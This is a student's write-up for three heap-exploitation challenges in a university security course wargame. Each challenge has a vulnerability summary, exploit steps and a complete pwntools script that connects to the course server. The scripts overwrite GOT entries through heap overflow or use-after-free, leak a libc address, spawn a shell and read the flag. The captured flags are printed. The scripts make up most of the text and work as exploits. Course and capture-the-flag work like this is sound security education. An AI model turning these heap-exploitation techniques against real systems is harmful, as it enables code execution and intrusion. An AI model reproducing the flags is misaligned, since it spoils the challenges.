# **COMP6447 Wargame 4** - Johnathan Liauw (z5136212)
## **1. heap-1 - babys_first_1**
_General Overview of Problems Faced:_
Has to learn about how heap memory is allocated and reverse the binary to figure out how the malloced memory is used by the program

_List of Vulnerabilities:_
1. User's input can overflow the first malloc chunk and the second malloc chunk

_Steps To Exploit:_
1. Reverse the binary to find the exact offset to overwrite the puts GOT address and the address it use as the argument
2. Overwrite the puts GOT address with system GOT and the argument address with an address found in the binary pointing to _"/bin/sh"_
3. Call view fish so system will get called with the argument we supplied.

_Script/Command Used:_
```python
#!/usr/bin/python

from pwn import *
import re

system = 0x8048526
command = 0x8048d74     # /bin/sh

c = remote("wargames.6447.sec.edu.au", 9001)

c.sendline("1")
c.sendline("1")
c.sendline("1")
c.sendline("1")

payload = "a"*102
payload += p32(system)
payload += "a"*13
payload += p32(command)

log.info("Sending payload...")
c.sendline(payload)

c.sendline("3")
c.sendline("1")

time.sleep(1)

c.sendline("cat /flag")

reply = c.recvuntil('}')
flag = re.search("6447{(.*)}", reply).group(0)

log.success("Flag found: %s" %(flag))

c.close()
```
_Flag:_
'6447{09d435a4-a0dd-46a9-bd7f-f39fdbf10cd3}'
---
## **2. heap-2 - babys_first_2**
_General Overview of Problems Faced:_
Have to understand how fastbin deal with free chunks then allocating them again

_List of Vulnerabilities:_
1. The delete function doesn't remove the entry in the array after deleting which leads to a use after free vulnerability and also double free vulnerability

_Steps To Exploit:_
1. Create the first fish, free it, then create a second one, since fastbin allocate new chunksfrom the free chunks like a stack, the first name address will become the second fish address and the first fish address will become the second name address, basically swapped
2. By exploit the use after free, we can write to the second fish' name and call view on the first fish which will be excuting the address we put in the offset to originally puts GOT in the second fish's name
3. Put that address with one found in the binary which will execute a shell for us

_Script/Command Used:_
```python
#!/usr/bin/python

from pwn import *

c = remote("wargames.6447.sec.edu.au", 9002)

call = 0x080486c0   # An address which will call /bin/sh for us

c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("aaaa")

c.recvuntil('>')
c.sendline("4")
c.recvuntil('>')
c.sendline("1")

c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("2")
c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')

payload = "a"*38
payload += p32(call)

log.info("Sending payload...")
c.sendline(payload)

c.recvuntil('>')
c.sendline("3")
c.recvuntil('>')
c.sendline("1")

c.sendline("cat /flag")

flag = c.recvline()
log.success("Flag found: %s" % (flag))

c.close()
```
_Flag:_
'6447{b20e6d03-f58c-43b7-974a-f801bb9a2fb5}'
---
## **3. heap-3 - babys_first_3**
_General Overview of Problems Faced:_
1. Have to figure out a way to leak the fputs GOT

_List of Vulnerabilities:_
1. The delete function doesn't remove the entry in the array after deleting which leads to a use after free vulnerability and also double free vulnerability

_Steps To Exploit:_
1. First we do the same thing like what we did in heap-2 but with the values as -1 which will make it 0xffffffff so that printf will not get null-terminated, by doing this we can leak the fputs GOT address
2. Use the libc database to calculate the offset to system and _"/bin/sh"_
3. Overwrite the orignal fputs and address to the name in one of the fish
4. Call view on the fish we modified then we will get a shell

_Script/Command Used"_
```python
#!/usr/bin/python

from pwn import *
import re

#c = process("./babys_first_3")
c = remote("wargames.6447.sec.edu.au", 9003)
#gdb.attach(c)

c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')
c.sendline("aaaa")

c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("2")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')
c.sendline("bbbb")

c.recvuntil('>')
c.sendline("4")
c.recvuntil('>')
c.sendline("1")

c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("3")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')
c.sendline("cccc")

c.recvuntil('>')
c.sendline("3")
c.recvuntil('>')
c.sendline("3")

reply = c.recvuntil('>')
fputs = u32(reply[9:13])
system = fputs-0x23d40
#system = fputs-0x29370
log.info("Fputs at %s" % (hex(fputs)))

command = fputs+0x1008af

c.sendline("2")
c.recvuntil('>')
c.sendline("3")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')
c.sendline("-1")

c.recvuntil('>')
payload = "a"*8
payload += p32(system)
payload += p32(command)
c.send(payload)

c.recvuntil('>')
c.sendline("3")
c.recvuntil('>')
c.sendline("1")

time.sleep(1)
c.sendline("cat /flag")
reply = c.recvuntil('}')
flag = re.search("6447{(.*)}", reply).group(0)

log.success("Flag found: %s" % (flag))

c.close()
```
_Flag:_
'6447{401cb70c-1032-4ffe-8230-f0bbf81e8370}'
---

